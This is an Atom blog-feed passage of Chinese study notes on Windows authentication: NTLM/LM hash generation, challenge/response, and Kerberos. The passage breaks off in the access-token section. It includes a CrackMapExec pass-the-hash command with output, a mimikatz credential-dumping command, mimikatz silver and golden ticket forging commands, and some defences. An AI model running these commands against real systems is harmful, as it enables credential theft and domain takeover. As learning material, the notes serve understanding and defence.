<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CaiJiang&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-25T16:59:41.315Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>kuailedexiaohua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于Windows协议学习</title>
    <link href="http://example.com/2023/03/10/%E5%85%B3%E4%BA%8EWindows%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/03/10/%E5%85%B3%E4%BA%8EWindows%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-03-10T08:02:21.000Z</published>
    <updated>2023-04-25T16:59:41.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    网络上关于Windows认证方式的学习的文章，在此为了对原理理解更加透彻，现在跟着网上大佬们的资料学习，供以后参考使用。</p><h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><h3 id="本地认证基础知识"><a href="#本地认证基础知识" class="headerlink" title="本地认证基础知识"></a>本地认证基础知识</h3><p>​    Windows密码存储地址：%SystemRoot%\system32\config\sam</p><p>​    当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功。这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p><p>​    <strong>Windows本身不保存明文密码，只保留密码的Hash</strong></p><p>​    为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。</p><h3 id="NTLM-NT-LAN-Manager-Hash"><a href="#NTLM-NT-LAN-Manager-Hash" class="headerlink" title="NTLM(NT LAN Manager) Hash"></a>NTLM(NT LAN Manager) Hash</h3><p>​    在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。</p><p>​    NTLM Hash是支持Net NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成。</p><pre><code>admin:1003:AAD3B435B51404EEAAD3B435B51404EE:111F54A2A4C0FB3D7CD9B19007809AD6:::Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9A81:::</code></pre><p>​    其中冒号分割的前半段<code>AAD3B435B51404EEAAD3B435B51404EE</code>是lm hash，后半段<code>111F54A2A4C0FB3D7CD9B19007809AD6</code>是ntlm hash。前半段放到cmd5解密会发现是空密码，那是因为Windows版本的原因。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-095521.png"                      alt="image-20230423175521048"                ></p><h3 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h3><p>​    这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p><p>​    <strong>NTLM与NTLM Hash相互对应。</strong></p><p>​    在本地认证的过程中，其实是把用户输入的密码转换为NTLM hash与SAM中NTLM hash进行比较。NTLM Hash的前身是LM Hash，目前基本淘汰，但是还是存在。</p><h3 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h3><p>​    密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) = 61646d696e</span><br><span class="line">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure><p>​    首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-124726.png"                      alt="image-20230422204725628"                ></p><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>​    在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。<strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">将所有小写字母转换为大写字母</span><br><span class="line">• &gt;123ABC // 未达到7个字符</span><br><span class="line">• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补</span><br><span class="line">• &gt;31323341424300000000000000</span><br><span class="line">• 将密码分割为两组7个字节的块</span><br><span class="line">• &gt;31323341424300 00000000000000 // 16进制</span><br><span class="line">• 将每组转化为比特流，不足56Bit则在左边加0</span><br><span class="line">• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000</span><br><span class="line">• 将比特流按照7比特一组，分出8组，末尾加0</span><br><span class="line"></span><br><span class="line">由于后者都为0，结果可想而知，那就都是0;</span><br><span class="line">• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。</span><br><span class="line">• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000</span><br><span class="line">• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB-91- 2F-5E-69-7C</span><br><span class="line">• 由于我们的密码不超过7字节，所以后面的一半是固定的:</span><br><span class="line">• AA-D3-B4-35-B5-14-04-EE</span><br><span class="line">• 连接两个DES加密字符串。这是LM哈希。</span><br><span class="line">• 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE</span><br></pre></td></tr></table></figure><p>​    <strong>由于我们的密码不超过7字节，所以后面的一半是固定的:AA-D3-B4-35-B5-14-04-EE</strong></p><p>​    在上面的产生过程中，脆弱点就在于DES的Key（<code>KGS!@#$%</code>）是固定的，也就是说，有了Key就能够解出原文。</p><p>​    并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p><h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><p>​    工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式， 没有信托机构。</p><p>​    <strong>假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。</strong></p><p>​    这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445。</p><p>​    早期SMB协议在网络上传输明文口令。后来出现 LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h3><p>​    NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。现在已经到了NTLMv2</p><p>​    <strong>这个协议只支持Windows</strong></p><h3 id="Challenge-挑战-Response-响应"><a href="#Challenge-挑战-Response-响应" class="headerlink" title="Challenge(挑战)/Response(响应)"></a>Challenge(挑战)/Response(响应)</h3><p>​    NTLM协议的认证过程分为三步：</p><ul><li>协商</li><li>质询</li><li>验证</li></ul><p>​    <strong>协商</strong>：主要用于确认双方协议版本</p><p>​    <strong>质询</strong>：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p><p>​    <strong>验证</strong>：验证主要是在质询完成后，验证结果，是认证的最后一步。</p><p>​    质询的完整过程：</p><ul><li><p>1.客户端向服务器端发送用户信息(用户名)请求</p></li><li><p>2.服务器接受到请求，生成一个16位的随机数，被称之为“Challenge”， 使用登录用户名对应的<strong>NTLM Hash</strong>加密Challenge(16位随机字符)， 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机 字符)发送给客户端。</p></li><li><p>//第二部可以理解为：Net NTLM Hash = NTLM Hash(Challenge)</p></li><li><p>3.客户端接受到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p></li></ul><p>​    其中，经过NTLM Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash。并且这个NTLM Hash始终没有在网络中传输。</p><p>​    注意:</p><p>​    1. Chanllenge是Server产生的一个16字节的随机数，每次认证都不同</p><p>​    2. Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-150045.png"                      alt="image-20230422230044957"                ></p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>​    NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p><p>​    具体有什么不同:</p><ul><li><strong>Challage:NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。</strong></li><li><strong>Net-NTLM Hash:NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</strong></li></ul><h3 id="NTLM协议延伸"><a href="#NTLM协议延伸" class="headerlink" title="NTLM协议延伸"></a>NTLM协议延伸</h3><p>​    我们都用过Responder工具，那么其实它就是启动一个NTLM服务端，服务端可以得到客户端发过来的Net-NTLM hash</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-165638.png"                      alt="img"                ></p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h3><p>​    在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过搜集这些信息有助于我们扩大战果，尤其是在域环境下。</p><p>​    哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。解决了我们渗透中获取不到明文密码、破解不了NTLM Hash而又想扩大战果的问题。</p><p><strong>Pass The Hash - 必要条件</strong></p><ul><li>哈希传递需要被认证的主机能够访问到服务器</li><li><strong>哈希传递需要被传递认证的用户名</strong></li><li>哈希传递需要被传递认证用户的NTLM Hash</li></ul><p>要完成一个NTLM认证，第一步需要客户端将自己要参与认证的 用户名发送至服务器端，等待服务器端给出的Challenge。其实哈希传递就是使用用户名对应的NTLM Hash将服务器给出的 Chanllenge加密，生成一个Response，来完成认证。Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p><p>Pass The Hash的工具：</p><ul><li>Smbmap</li><li>CrackMapExec</li><li>Smbexec</li><li>Metasploit</li></ul><p>使用CrackMapExec实现Hash传递：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:<span class="meta"># cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami</span></span><br><span class="line">SMB <span class="number">192.168</span><span class="number">.3</span><span class="number">.5</span> <span class="number">445</span> LIYINGZHEA30B</span><br><span class="line">[*] Windows <span class="number">7</span> Ultimate <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (name:LIYINGZHEA30B)</span><br><span class="line">(domain:PAYLOADS) (signing:False) (SMBv1:True)</span><br><span class="line">SMB <span class="number">192.168</span><span class="number">.3</span><span class="number">.5</span> <span class="number">445</span> LIYINGZHEA30B</span><br><span class="line">[+] PAYLOADS\administrator <span class="title function_">dab7de8feeb5ecac65faf9fdc6cac3a9</span></span><br><span class="line"><span class="params">(Pwn3d!)</span>SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command</span><br></pre></td></tr></table></figure><h2 id="Kerberos域认证"><a href="#Kerberos域认证" class="headerlink" title="Kerberos域认证"></a>Kerberos域认证</h2><h3 id="Active-Directory-活动目录-概念"><a href="#Active-Directory-活动目录-概念" class="headerlink" title="Active Directory(活动目录)概念"></a>Active Directory(活动目录)概念</h3><p>​    Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务。</p><p>​    活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p><ul><li>Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</li><li>网络对象分为:用户、用户组、计算机、域、组织单位以及安全策略等。</li></ul><h3 id="Active-Directory-活动目录-功能"><a href="#Active-Directory-活动目录-功能" class="headerlink" title="Active Directory(活动目录)功能"></a>Active Directory(活动目录)功能</h3><ul><li>服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。</li><li>资源管理:管理打印机、文件共享服务等网络资源。</li><li>桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。</li></ul><p>​    在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p><p>​    这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><h3 id="域认证体系-Kerbroes"><a href="#域认证体系-Kerbroes" class="headerlink" title="域认证体系 - Kerbroes"></a>域认证体系 - Kerbroes</h3><p>​    Kerberos 是一种网络认证协议，其设计目标是通过<strong>密钥系统</strong>为客户机 / 服务器应用程序提供强大的认证服务。<strong>该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术(如:共享密钥)执行认证服务的。</strong></p><h3 id="域认证所参与的角色"><a href="#域认证所参与的角色" class="headerlink" title="域认证所参与的角色"></a>域认证所参与的角色</h3><p>​    Kerberos的标志是三只狗头，狗头分别代表以下角色：</p><ul><li><strong>Client</strong></li><li><strong>Server</strong></li><li><strong>KDC(Key Distribution Center) = DC(Domain Controller)</strong></li></ul><p>​    Kerberos认证协议的基础概念：</p><p>​    票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p><h3 id="域认证所参与的角色（KDC）"><a href="#域认证所参与的角色（KDC）" class="headerlink" title="域认证所参与的角色（KDC）"></a>域认证所参与的角色（KDC）</h3><p>​    KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：</p><ul><li>Authentication Service（AS）: <strong>为client生成TGT的服务</strong></li><li>Ticket Granting Service（TGS）: <strong>为client生成某个服务的ticket</strong></li><li>account database（AD），存储所有client的白名单，<strong>只有存在于白名单的client才能顺利申请到TGT</strong>。</li></ul><p>​    从物理层面看，AD与KDC均为域控制器(Domain Controller)。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-173958.png"                      alt="image-20230423013957918"                ></p><h3 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h3><ol><li>client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过在AD中存储黑名单和白名单来区分client。成功后，返回AS返回TGT给client。</li><li>client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。</li><li>client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。</li></ol><h3 id="域认证详细流程"><a href="#域认证详细流程" class="headerlink" title="域认证详细流程"></a>域认证详细流程</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-174953.png"                      alt="image-20230423014953231"                ></p><p>​    首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>​    KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><ul><li>Session Key用于客户端向TGS服务通信。</li><li>域内所有网络对象的凭证都在AD中保存</li><li>KDC中某个用户指的是krbtgt</li></ul><p>数据结构：</p><p>这是客户端发送请求信息的数据结构：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-175741.png"                      alt="image-20230423015741694"                ></p><p>这是KDC返回数据的结构</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-22-175753.png"                      alt="image-20230423015752492"                ></p><p>​    其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。</p><p>​    Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。</p><p>​    <strong>第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-022225.png"                      alt="image-20230423102224827"                ></p><p>​    第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>​    如果假设这个数据被中间人窃取到，也无法在短时间内破解，因为KDC会校验时间戳。</p><p>​    KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>​    验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p>Ticket组成如下：</p><p>​    Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-034129.png"                      alt="image-20230423114128907"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-034916.png"                      alt="image-20230423114915999"                ></p><p>​    在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><ul><li>Ticket客户端无法解密</li><li>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)</li><li>比较时间长度</li></ul><p>​    校验通过后，认证成功，该票据会一直存在客户端内存中。</p><p><strong>其实，TGT的结构和Ticket结构是相同的，只是中间的session key和server session key是不同的，session key是AS给客户端的，而server session key是TGS给客户端的。</strong></p><h3 id="白银票据-Silver-Tickets"><a href="#白银票据-Silver-Tickets" class="headerlink" title="白银票据(Silver Tickets)"></a>白银票据(Silver Tickets)</h3><p>​    白银票据特点:</p><ul><li>1.不需要与KDC进行交互</li><li>2.需要目标服务的NTLM Hash</li></ul><p>在第三步认证中的Ticket的组成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket=Server Hash(Server Session Key+Client info+End Time) </span><br></pre></td></tr></table></figure><p>​    当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p>​    <strong>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</strong>我们只需要知道server的Hash，我们就可以伪造一个票据，但是这个票据只能够在server使用，其他的不能用。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>​    Other：</p><ul><li>kerberos::list #列出票据</li><li>kerberos::purge # 清除票据</li></ul><p>​    首先需要导出Server Hash：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</span><br></pre></td></tr></table></figure><p>​    伪造票据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure><p>​    这个user用户名可以是假的，因为server是不会去验证的。</p><p>​    由于白银票据需要目标服务器的Hash，所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th align="left">服务注释</th><th align="left">服务名</th></tr></thead><tbody><tr><td align="left">WMI</td><td align="left">HOST、RPCSS</td></tr><tr><td align="left">Powershell Remoteing</td><td align="left">HOST、HTTP</td></tr><tr><td align="left">WinRM</td><td align="left">HOST、HTTP</td></tr><tr><td align="left">Scheduled Tasks</td><td align="left">HOST</td></tr><tr><td align="left">LDAP 、<strong>DCSync</strong></td><td align="left">LDAP</td></tr><tr><td align="left">Windows File Share (CIFS)</td><td align="left">CIFS</td></tr><tr><td align="left">Windows Remote ServerAdministration Tools</td><td align="left">RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="白银票据-Silver-Tickets-防御"><a href="#白银票据-Silver-Tickets-防御" class="headerlink" title="白银票据(Silver Tickets)防御"></a>白银票据(Silver Tickets)防御</h3><ul><li>1.尽量保证服务器凭证不被窃取</li><li>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</li></ul><p>开启方式:</p><p>将注册表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters</span><br></pre></td></tr></table></figure><p>中的<code>ValidateKdcPacSignature</code>设置为1。</p><h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><p>黄金票据特点:</p><ul><li>1.需要与DC通信</li><li>2.需要krbtgt用户的hash</li></ul><p><strong>PS:这里的krbtgt hash就是之前讲的KDC Hash</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-071528.png"                      alt="image-20230423151527534"                ></p><h3 id="黄金票据-Golden-Tickets-MSF-kiwi"><a href="#黄金票据-Golden-Tickets-MSF-kiwi" class="headerlink" title="黄金票据(Golden Tickets)-MSF kiwi"></a>黄金票据(Golden Tickets)-MSF kiwi</h3><p>​    使用meterpreter中的kiwi模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p>​    创建票据：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-071908.png"                      alt="image-20230423151907722"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072003.png"                      alt="image-20230423152003005"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072212.png"                      alt="image-20230423152211682"                ></p><p>使用wmic在目标服务器上创建一个进程：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-23-072341.png"                      alt="image-20230423152341215"                ></p><h3 id="黄金票据-Golden-Tickets-伪造"><a href="#黄金票据-Golden-Tickets-伪造" class="headerlink" title="黄金票据(Golden Tickets) - 伪造"></a>黄金票据(Golden Tickets) - 伪造</h3><p>伪造票据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure><h3 id="Tickets-总结"><a href="#Tickets-总结" class="headerlink" title="Tickets 总结"></a>Tickets 总结</h3><ul><li>黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。</li><li>从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的票据失效。最根本的办法是不允许域管账户登录其他服务器。</li><li>白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。</li><li>从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。</li></ul><h2 id="Windows-Access-Token"><a href="#Windows-Access-Token" class="headerlink" title="Windows Access Token"></a>Windows Access Token</h2><h3 id="Windows-Access-Token-简介"><a href="#Windows-Access-Token-简介" class="headerlink" title="Windows Access Token 简介"></a>Windows Access Token 简介</h3><p>​    Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。</p><p>​    Access Token种类：</p><ul><li>主令牌</li><li>模拟令牌</li></ul><p>​    一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。</p><p>​    <strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</strong></p><h3 id="Windows-Access-Token组成"><a href="#Windows-Access-Token组成" class="headerlink" title="Windows Access Token组成"></a>Windows Access Token组成</h3><ul><li>用户帐户的安全标识符(SID)</li><li>用户所属的组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>主要组的SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li></ul><h3 id="Windows-Access-Token-–-SID-Security-Identifiers-安全标识符"><a href="#Windows-Access-Token-–-SID-Security-Identifiers-安全标识符" class="headerlink" title="Windows Access Token – SID (Security Identifiers)安全标识符"></a>Windows Access Token – SID (Security Identifiers)安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有固定的SID</p><p>SID的表现形式:</p><ul><li>域SID-用户ID</li><li>计算机SID-用户ID</li><li>SID列表都会存储在域控的AD或者计算机本地账户数据库中。</li></ul><h3 